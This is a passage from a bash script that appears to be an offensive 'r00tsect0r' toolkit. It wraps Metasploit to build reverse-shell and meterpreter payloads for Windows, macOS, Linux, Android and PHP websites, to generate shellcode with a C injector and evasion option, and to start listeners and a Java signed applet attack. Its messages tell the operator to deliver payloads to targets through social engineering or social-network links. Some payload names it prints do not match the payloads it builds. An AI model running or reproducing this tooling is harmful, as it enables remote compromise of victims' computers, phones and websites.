      sleep 2
      xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'"
      sh_ejt # build resource file (shell_listenner.rc)

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
fi
}



sh_ejt () {
Colors;

   # building resource file (shell_listenner.rc)
   cd $H0m3/opensource/priv8
   mkdir handler > /dev/null 2>&1
   cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$name" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

   echo "use exploit/multi/handler" > $resource-handler.rc
   echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $resource-handler.rc
   echo "set LPORT $lport" >> $resource-handler.rc
   echo "set LHOST $lhost" >> $resource-handler.rc
   echo "set ExitOnSession false" >> $resource-handler.rc
   echo "exploit -j -z" >> $resource-handler.rc
   zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
   cd $H0m3/opensource
   clear
}


sh_perlis4 () {
Colors;

      # chose to run  or not the persistence listenner
      clear
      echo ${BlueF}[*]${RedF}:${white}start 'persistence' listenner?${Reset};

cat << !

     Payload [persistence] Final Config:
     ===================================
     LHOST            : $lhost
     LPORT            : 8080
     PAYLOAD          : windows/meterpreter/reverse_tcp
     HANDLER          : $H0m3/opensource/priv8/handler/microsoft_persistence.rc
     AFFECTED SYSTEMS : Windows OS

!

      read -p "[+]:{yes|no}(choise):" pass
      if test "$pass" = "yes"

then

      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${white}starting 'persistence' listenner ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - 'persistence' payload listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT 8080; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"

   # building resource file (shell_listenner.rc)
   cd $H0m3/opensource/priv8
   mkdir handler > /dev/null 2>&1
   cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$name" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

   echo "use exploit/multi/handler" > $resource-persistence.rc
   echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $resource-persistence.rc
   echo "set LPORT 8080" >> $resource-persistence.rc
   echo "set LHOST $lhost" >> $resource-persistence.rc
   echo "set ExitOnSession false" >> $resource-persistence.rc
   echo "exploit -j -z" >> $resource-persistence.rc
   zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-persistence.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
   cd $H0m3/opensource

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   # building resource file (shell_listenner.rc)
   cd $H0m3/opensource/priv8
   mkdir handler > /dev/null 2>&1
   cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$name" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

   echo "use exploit/multi/handler" > $resource-persistence.rc
   echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $resource-persistence.rc
   echo "set LPORT 8080" >> $resource-persistence.rc
   echo "set LHOST $lhost" >> $resource-persistence.rc
   echo "set ExitOnSession false" >> $resource-persistence.rc
   echo "exploit -j -z" >> $resource-persistence.rc
   zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-persistence.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
   cd $H0m3/opensource
   clear
fi
}











# -------------------------------
# payload to exploit apple machines
# -------------------------------
sh_apple () {
Colors;

   # get user input to build the payload
   echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
   lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
   name=$(zenity --title="Name your payload" --text "example: appleOsx.macho" --entry --width 300) > /dev/null 2>&1
   # building payload
   echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $name ]${Reset};
   xterm -T "r00tsect0r - building $name" -geometry 110x23 -e "msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -a x86 --platform OSX -f macho > $H0m3/opensource/priv8/$name"

      # set permissions to file and copy to opensource folder
      cd $H0m3/opensource/priv8
      chmod +x $name


cat << !

     Payload [PKG] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $name
     STORAGE IN       : $H0m3/opensource/priv8/$name
     PAYLOAD          : osx/x86/isight/bind_tcp
     AFFECTED SYSTEMS : Apple OSx

!
    # chose what to do with generated backdoor
    cH0=$(zenity --list --title "APPLE PAYLOAD" --text "Chose what to do with generated: $name" --radiolist --column "Pick" --column "Option" TRUE "start multi-handler (listenner)" FALSE "use host-a-file-attack" --width 340 --height 200) > /dev/null 2>&1

      if [ "$cH0" = "use host-a-file-attack" ]; then
      cp $H0m3/opensource/priv8/$name $H0m3/$name
      sh_powershell

        elif [ "$cH0" = "start multi-handler (listenner)" ]; then
        sh_3004 # jump to post-exploitation

      else
      # error funtion (aborted by user)
      echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
      sleep 2
      fi
}


sh_3004 () {
Colors;

      # starting a listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD osx/x86/shell_reverse_tcp; exploit'"

   # building resource file (shell_listenner.rc)
   cd $H0m3/opensource/priv8
   mkdir handler > /dev/null 2>&1
   cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$name" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

       # storing handler
       echo "use exploit/multi/handler" > $resource-handler.rc
       echo "set PAYLOAD osx/x86/isight/bind_tcp" >> $resource-handler.rc
       echo "set LPORT $lport" >> $resource-handler.rc
       echo "set LHOST $lhost" >> $resource-handler.rc
       echo "set ExitOnSession false" >> $resource-handler.rc
       echo "exploit -j -z" >> $hand-handler.rc
       zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
   cd $H0m3/opensource
   clear
}















# -------------------------------
# payload to exploit linux distros
# -------------------------------
sh_linux () {
Colors;

   # get user input to build the payload
   echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
   lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
   name=$(zenity --title="Name your payload" --text "example: rootsector.elf" --entry --width 300) > /dev/null 2>&1

   # building payload
   echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $name ]${Reset};
   xterm -T "r00tsect0r - building $name" -geometry 110x23 -e "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x86 --platform Linux -f elf > $H0m3/opensource/priv8/$name"

      # set permissions to file and copy to opensource folder
      cd $H0m3/opensource/priv8
      chmod +x $name

cat << !

     Payload [linux] Final Config:
     =============================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $name
     STORAGE IN       : $H0m3/opensource/priv8/$name
     PAYLOAD          : linux/x86/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Linux OS

!
    # chose what to do with generated backdoor
    cH0=$(zenity --list --title "LINUX PAYLOAD" --text "Chose what to do with generated: $name" --radiolist --column "Pick" --column "Option" TRUE "start multi-handler (listenner)" FALSE "use host-a-file-attack" --width 340 --height 200) > /dev/null 2>&1

      if [ "$cH0" = "use host-a-file-attack" ]; then
      cp $H0m3/opensource/priv8/$name $H0m3/$name
      sh_powershell

        elif [ "$cH0" = "start multi-handler (listenner)" ]; then
        sh_4939 # jump to post-exploitation

      else
      # error funtion (aborted by user)
      echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
      sleep 2
      fi
}


sh_4939 () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass=$(zenity --list --title "POST EXPLOITATION" --text "If you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default Listenner" FALSE "Post-auto.rc" --width 350 --height 205) > /dev/null 2>&1


   if [ "$pass" = "Default Listenner" ]; then
     # starting a metasploit listenner
     echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
     echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
     sleep 2
     xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'"
     sh_rcfile3 # build resource file (latest listenner settings)


       elif [ "$pass" = "Post-auto.rc" ]; then
       # starting a metasploit listenner (post-auto.rc)
       echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
       echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
       sleep 2
       xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'"
       sh_rcfile3 # build resource file (latest listenner settings)


   else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     cd $H0m3/opensource
     sleep 2
     clear
fi
}


sh_rcfile3 () {
Colors;

   # building resource file (shell_listenner.rc)
   cd $H0m3/opensource/priv8
   mkdir handler > /dev/null 2>&1
   cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$name" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

   echo "use exploit/multi/handler" > $resource-handler.rc
   echo "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> $resource-handler.rc
   echo "set LPORT $lport" >> $resource-handler.rc
   echo "set LHOST $lhost" >> $resource-handler.rc
   echo "set ExitOnSession false" >> $resource-handler.rc
   echo "exploit -j -z" >> $resource-handler.rc
   zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
   cd $H0m3/opensource
   clear
}













# -------------------------------
# java signed applet attack
# -------------------------------
sh_multi () {
Colors;

   echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
   LHOST=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   URIPATH=$(zenity --title="Input URIPATH" --text "example: /my-fotos" --entry --width 300) > /dev/null 2>&1

      # building payload
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ building payload ]${Reset};
      echo ""
      echo ${YellowF}[+]${RedF}:send the [URL provided by metasploit] to a target machine using social engineering${Reset};
      echo ${YellowF}[+]${RedF}:or post the link on social network website, and wait... ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - java-Signed-applet attack" -geometry 110x23 -e "sudo msfconsole -x 'use multi/browser/java_signed_applet; set LHOST $LHOST; set URIPATH $URIPATH; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
      echo ""

}














# -------------------------------
# android meterpreter backdoor
# -------------------------------
sh_androi () {
Colors;

   echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
   LHOST=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   LPORT=$(zenity --title="Input LPORT" --text "example: 8080" --entry --width 300) > /dev/null 2>&1
   name=$(zenity --title="Name your payload" --text "example: photos.apk" --entry --width 300) > /dev/null 2>&1


   # chose to use meterpreter or shell payload
   Ch0=$(zenity --list --title "ANDROID PAYLOAD" --text "Chose meterpreter or shell payload" --radiolist --column "Pick" --column "Option" TRUE "meterpreter" FALSE "shell" --width 320 --height 200) > /dev/null 2>&1

      if [ "$Ch0" = "meterpreter" ]; then
        sh_hdg

      elif [ "$Ch0" = "shell" ]; then
         sh_hdg2

else

  echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
  sleep 2
fi
}



sh_hdg () {
Colors;
      # building payload meterpreter
      echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $name ]${Reset};
      xterm -T "r00tsect0r - building $name" -geometry 110x23 -e "msfvenom -p android/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -a dalvik --platform Android -f raw > $H0m3/opensource/priv8/$name"

         # set permissions to file and copy to opensource folder
         cd $H0m3/opensource/priv8
         chmod +x $name

cat << !

     Payload [APK] Final Config:
     ===========================
     LHOST            : $LHOST
     LPORT            : $LPORT
     FILENAME         : $name
     STORAGE IN       : $H0m3/opensource/priv8/$name
     PAYLOAD          : android/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Android OS

!
      echo ${BlueF}[*]${RedF}:${white}send ${GreenF}[$name]${white} to a target machine using social engineering${Reset};
      QuE=$(zenity --question --title "ANDROID PAYLOAD" --text "-:[ START A LISTENNER ? ]:-" --width 300) > /dev/null 2>&1
        if [ "$?" -eq "0" ]; then

          # starting a listenner
          echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
          echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
          sleep 2
          xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"

   # building resource file (shell_listenner.rc)
   cd $H0m3/opensource/priv8
   mkdir handler > /dev/null 2>&1
   cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$name" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

   echo "use exploit/multi/handler" > $resource-handler.rc
   echo "set PAYLOAD android/meterpreter/reverse_tcp" >> $resource-handler.rc
   echo "set LPORT $LPORT" >> $resource-handler.rc
   echo "set LHOST $LHOST" >> $resource-handler.rc
   echo "set ExitOnSession false" >> $resource-handler.rc
   echo "exploit -j -z" >> $resource-handler.rc
   zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
   cd $H0m3/opensource
   clear

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   cd $H0m3/opensource
   sleep 2
   clear
fi
}




sh_hdg2 () {
Colors;
      # building android payload shell
      echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $name ]${Reset};
      xterm -T "r00tsect0r - building $name" -geometry 110x23 -e "msfvenom -p android/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -a dalvik --platform Android -f raw > $H0m3/opensource/priv8/$name"

         # set permissions to file and copy to opensource folder
         cd $H0m3/opensource/priv8
         chmod +x $name
         chown $user $name

cat << !

     Payload [APK] Final Config:
     ===========================
     LHOST            : $LHOST
     LPORT            : $LPORT
     FILENAME         : $name
     STORAGE IN       : $H0m3/opensource/priv8/$name
     PAYLOAD          : android/shell/reverse_tcp
     AFFECTED SYSTEMS : Android OS

!
      echo ${BlueF}[*]${RedF}:${white}send ${GreenF}[$name]${white} to a target machine using social engineering${Reset};
      QuE=$(zenity --question --title "ANDROID PAYLOAD" --text "-:[ START A LISTENNER ? ]:-" --width 300) > /dev/null 2>&1
        if [ "$?" -eq "0" ]; then

          # starting a listenner
          echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
          echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
          sleep 2
          xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set PAYLOAD android/shell/reverse_tcp; exploit'"

   # building resource file (shell_listenner.rc)
   cd $H0m3/opensource/priv8
   mkdir handler > /dev/null 2>&1
   cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$name" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

   echo "use exploit/multi/handler" > $resource-handler.rc
   echo "set PAYLOAD android/shell/reverse_tcp" >> $resource-handler.rc
   echo "set LPORT $LPORT" >> $resource-handler.rc
   echo "set LHOST $LHOST" >> $resource-handler.rc
   echo "set ExitOnSession false" >> $resource-handler.rc
   echo "exploit -j -z" >> $resource-handler.rc
   zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
   chown $user $resource-handler.rc > /dev/null 2>&1
   chown -R $user $H0m3/opensource/priv8/handler
   cd $H0m3/opensource
   clear

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   cd $H0m3/opensource
   sleep 2
   clear
fi
}










# -------------------------------
# webshell to exploit websites
# -------------------------------
sh_shell () {
Colors;

   # get user input to build the payload
   echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
   lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 8080" --entry --width 300) > /dev/null 2>&1
   name=$(zenity --title="Name your webshell" --text "example: rootsector.php" --entry --width 300) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $name ]${Reset};
   xterm -T "r00tsect0r - building $name" -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $H0m3/opensource/priv8/webshell.php"

      # set permissions, shorting RAW data
      cd $H0m3/opensource/priv8
      sed "s/#//" webshell.php >> $name
      chmod +x $name
      rm webshell.php > /dev/null 2>&1

cat << !

     Payload [PHP] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $name
     PAYLOAD          : php/meterpreter/reverse_tcp
     STORAGE IN       : $H0m3/opensource/priv8/$name
     AFFECTED SYSTEMS : websites (php)

!

      QuE=$(zenity --question --title "PHP PAYLOAD" --text "-:[ START A LISTENNER ? ]:-" --width 300) > /dev/null 2>&1
        if [ "$?" -eq "0" ]; then

          # starting a listenner
          echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
          echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
          sleep 2
          xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
        cd $H0m3/opensource
        clear


else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   cd $H0m3/opensource
   sleep 2
   clear

fi
}








# -------------------------------
# generate shellcode in various formats
# -------------------------------
sh_shellcod () {
Colors;
echo ${BlueF}[*]${RedF}:${BlueF}[shellcode generator]${RedF}:${GreenF}[ RUNNING ]${Reset};
cat <<!

     ┌─┐┬ ┬┌─┐┬  ┬  ┌─┐┌─┐┌┬┐┌─┐
     └─┐├─┤├┤ │  │  │  │ │ ││├┤ 
     └─┘┴ ┴└─┘┴─┘┴─┘└─┘└─┘─┴┘└─┘
!

# CHOSE TO RUN ORNOT THE SHELLCODE GENERATOR MODULE
QuE=$(zenity --question --title "SHELLCODE GENERATOR MODULE" --text "Shellcode Generator will use msf to build\nshellcode and start the comrrespondent\nlistenner, we can also chose to output the\ngenerated shellcode in various formats:\n[ C, dll, war, javascript, ruby, python, etc. ]" --width 400) > /dev/null 2>&1
   if [ "$?" -eq "0" ]; then

     # jump to shellcode generator module
     sh_jmsm

else

    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    sleep 2
    clear

fi
}


sh_jmsm () {
Colors;

   # get user input to build the shellcod
   lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 8080" --entry --width 330) > /dev/null 2>&1


# input payload choise
paylo=$(zenity --list --title "SHELLCODE GENERATOR" --text "\nAvailable Payloads:\n" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/x64/shell_reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "java/shell/reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/ppc/shell_reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 400) > /dev/null 2>&1


# input shellcode output format
ett=$(zenity --list --title "SHELLCODE OUTPUT :" --radiolist --column "Pick" --column "Option" TRUE "c" FALSE "dll" FALSE "java" FALSE "ps1" FALSE "perl" FALSE "python" FALSE "powershell" FALSE "raw" FALSE "sh" FALSE "ruby" FALSE "vba" FALSE "vbs" FALSE "war" --width 320 --height 410) > /dev/null 2>&1

cat << !

     Shellcode Final Config:
     =======================
     Output Format : $ett
     LPORT         : $lport
     LHOST         : $lhost
     PAYLOAD       : $paylo

!

   # store payload in priv8 folder
   cd $H0m3/opensource/priv8


     if [ "$ett" "=" "c" ]; then
       # if payload output format = C then jump to C-INJECTOR
       # Variable declarations
       Sh3LL="$H0m3/opensource/priv8/shellcode.txt"
       InJEc="$H0m3/opensource/modules/exec.c"

         echo "" > shellcode.txt
         # use metasploit to build shellcode
         echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING SHELLCODE ]${Reset};
         xterm -T "BUILDING SHELLCODE" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f $ett >> shellcode.txt"
         zenity --title="SHELLCODE OUTPUT" --text "STORED UNDER:\n$H0m3/opensource/priv8/shellcode.txt" --info > /dev/null 2>&1

       # display generated shelcode
       echo ""
       cat shellcode.txt
       echo ""
       echo ""
       chown $user shellcode.txt
       sleep 2
     sh_C_injector


     elif [ "$ett" "=" "dll" ]; then
       # use metasploit to build shellcode
       echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING DLL PAYLOAD ]${Reset};
       xterm -T "BUILDING SHELLCODE" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f $ett >> shellcode.dll"
       chown $user $H0m3/opensource/priv8/shellcode.dll > /dev/null 2>&1
       zenity --title="SHELLCODE DLL OUTPUT" --text "STORED UNDER:\n$H0m3/opensource/priv8/shellcode.dll" --info > /dev/null 2>&1
     sh_ffH # jump to listenner


else

         echo "" > shellcode.txt
         # if payload output format <> C or <> DLL then jump to sh_shellcod2
         # use metasploit to build shellcode
         echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING SHELLCODE ]${Reset};
         xterm -T "BUILDING SHELLCODE" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f $ett >> shellcode.$ett"
         zenity --title="SHELLCODE OUTPUT" --text "STORED UNDER:\n$H0m3/opensource/priv8/shellcode.txt" --info > /dev/null 2>&1

       # display generated shelcode
       echo ""
       cat shellcode.txt
       echo ""
       echo ""
       chown $user shellcode.txt
       sleep 2
       sh_shellcod2
fi
}







sh_shellcod2 () {
Colors;

   # START LISTENNER (and build shell_listenner.rc)
   QuE=$(zenity --question --title "SHELLCODE GENERATOR" --text "-:[ START SHELLCODE LISTENNER ? ]:-" --width 340) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then


      # starting a listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Shellcode listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

          # shellcode.txt will be stored under '/opensource/priv8/' and
          # 'shell_listenner.rc' file with msf settings will be stored under
          # '/opensource/priv8/' if we wish to start a listenner later...
          echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}[ BUILDING RC FILE ] ${Reset};
          sleep 1
          cd $H0m3/opensource/priv8
          mkdir handler > /dev/null 2>&1
          cd handler > /dev/null 2>&1
          echo "use exploit/multi/handler" > shellcode-handler.rc
          echo "set PAYLOAD $paylo" >> shellcode-handler.rc
          echo "set LPORT $lport" >> shellcode-handler.rc
          echo "set LHOST $lhost" >> shellcode-handler.rc
          echo "set ExitOnSession false" >> shellcode-handler.rc
          echo "exploit -j -z" >> shellcode-handler.rc
          zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r shellcode-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
          chown $user shellcode-handler.rc > /dev/null 2>&1
          chown -R $user $H0m3/opensource/priv8/handler
   cd $H0m3/opensource


else

   Colors;
   echo ${RedF}[x]:[ QUITTING ]${Reset};
          # shellcode.txt will be stored under '/opensource/priv8/' and
          # 'shell_listenner.rc' file with msf settings will be stored under
          # '/opensource/priv8/' if we wish to start a listenner later...
          echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}[ BUILDING RC FILE ] ${Reset};
          sleep 1
          cd $H0m3/opensource/priv8
          mkdir handler > /dev/null 2>&1
          cd handler > /dev/null 2>&1
          echo "use exploit/multi/handler" > shellcode-handler.rc
          echo "set PAYLOAD $paylo" >> shellcode-handler.rc
          echo "set LPORT $lport" >> shellcode-handler.rc
          echo "set LHOST $lhost" >> shellcode-handler.rc
          echo "set ExitOnSession false" >> shellcode-handler.rc
          echo "exploit -j -z" >> shellcode-handler.rc
          zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r shellcode-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
          chown $user shellcode-handler.rc > /dev/null 2>&1
          chown -R $user $H0m3/opensource/priv8/handler
   cd $H0m3/opensource
fi
}





# -------------------------------
# C-INJECTOR - inject your shellcode
# into a 'C' funtion to make it executable.
# we are current in $H0m3/opensource/priv8 dir
# -------------------------------
sh_C_injector () {


# chose to use C-INJECTOR | start a lisenner | C-TO-EXE
ans=$(zenity --list --title "SHELLCODE GENERATOR" --text "Chose what to do with the generated shellcode\n\nexec.c = Compile shellcode into a C funtion to\nmake it executable under UNIX  distros.\n\nC-TO-EXE = Compile shellcode into .exe\n(it will build one windows payload)\n'C-TO-EXE needs Veil-Evasion installed'" --radiolist --column "Pick" --column "Option" TRUE "exec.c Injector" FALSE "C-TO-EXE (veil-evasion)" FALSE "Start a Listenner" --width 300 --height 360) > /dev/null 2>&1

  # INJECT SHELLCODE INTO A 'C' FUNTION
  if [ "$ans" "=" "exec.c Injector" ]; then
   #check if shellcode.txt exists
   echo ${BlueF}[*]${RedF}:${BlueF}[C-INJECTOR MODULE]${RedF}:${GreenF}[ RUNNING ]${Reset};
   sleep 2
   if [ -e $Sh3LL ]; then
